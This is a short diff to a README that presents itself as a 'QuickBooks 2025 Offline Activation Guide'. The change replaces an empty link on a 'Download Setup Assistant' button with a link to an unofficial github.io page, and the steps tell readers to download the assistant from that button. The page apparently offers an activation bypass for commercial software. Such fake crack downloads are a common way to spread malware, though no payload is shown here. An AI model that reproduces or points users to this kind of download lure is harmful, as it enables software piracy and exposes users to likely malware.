@@ -1,7 +1,7 @@
 # QuickBooks 2025 — Offline Activation Guide
 
 🔘 Download Setup Assistant:  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://quickbooks-smart-business-tool.github.io/.github/)
 
 ⚙️ How to Use:
 1. Download the setup assistant using the button above  
